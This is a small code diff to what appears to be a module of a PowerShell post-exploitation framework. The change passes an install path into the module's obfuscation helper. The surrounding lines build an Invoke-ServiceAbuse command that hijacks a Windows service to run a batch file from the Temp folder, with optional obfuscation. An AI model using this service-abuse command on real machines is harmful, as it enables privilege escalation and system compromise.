@@ -121,6 +121,6 @@ class Module:
 
         scriptEnd += "Invoke-ServiceAbuse -ServiceName \""+serviceName+"\" -Command \"C:\\Windows\\System32\\cmd.exe /C `\"$env:Temp\\debug.bat`\"\""
         if obfuscate:
-            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
         return script
